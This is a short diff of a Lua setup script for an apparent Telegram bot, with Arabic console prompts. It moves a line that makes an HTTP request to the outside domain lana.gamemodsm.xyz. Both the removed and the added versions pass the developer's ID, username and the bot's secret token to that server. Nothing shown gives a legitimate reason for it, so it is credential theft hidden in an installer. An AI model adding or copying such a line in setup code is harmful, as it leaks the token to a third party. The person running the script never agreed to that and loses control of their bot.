@@ -53,11 +53,11 @@ local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
 database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
-https.request("https://lana.gamemodsm.xyz/sadam/?id="..database:get(id_server..":SUDO:ID").."&user=@"..SUDOUSERNAME.."&token="..database:get(id_server..":token"))
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
 os.execute('lua sadam.lua')
+https.request("https://lana.gamemodsm.xyz/sadam/?id="..database:get(id_server..":SUDO:ID").."&user="..database:get(id_server..":SUDO:USERNAME").."&token="..database:get(id_server..":token"))
 end
 local create_config_auto = function()
 config = {
